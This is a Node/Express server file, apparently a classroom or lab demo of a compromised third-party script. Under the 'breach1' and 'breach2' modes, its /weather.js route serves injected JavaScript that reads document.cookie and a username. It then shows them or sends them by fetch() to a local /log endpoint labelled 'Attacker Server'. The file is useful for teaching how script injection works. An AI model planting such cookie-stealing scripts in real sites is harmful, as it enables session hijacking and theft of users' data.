import express from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import cors from "cors";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 5000;

const configPath = new URL("config.json", import.meta.url);
const config = JSON.parse(fs.readFileSync(configPath, "utf8"));
let mode = config.mode;
const args = process.argv;
const modeIndex = args.indexOf("--mode");
if (modeIndex !== -1 && args[modeIndex + 1]) mode = args[modeIndex + 1]; // if --mode exists and if value after --mode also exists
console.log(`[System] Starting ${config.appName} v.${config.version}...`);


app.use(cors());

app.get("/weather.js", (req, res) => {
    if (mode === "breach1") { // in cmd: node WeatherApp-5000/server.js --mode breach1
        res.type("text/javascript").send(`
        alert("HACKED: I can see your cookies: " +
            document.cookie + " and User: " +
            document.getElementById('username').innerText)`);
    }

    else if (mode === "breach2") {
        res.type("text/javascript").send(
            "const stolenCookie = document.cookie;" +
            "fetch(`http://localhost:5000/log?data=${stolenCookie}`);" +
            "console.log('Cookie successfully sent to Attacker Server!');");
    }

    else res.sendFile(path.join(__dirname, "weather.js"));
});


app.get("/log", (req, res) => {
    const cookie = req.query.data;
    if (cookie) res.send(console.log("Getting cookie...", cookie));
    else res.status(404).send(console.log("I don't see any cookie..."));
}); // IT CAN BE BLOCKED BY ADBLOCK........

app.listen(PORT, () => {
    console.log(`[System] Server started in mode "${mode}" on port ${PORT}.`);
})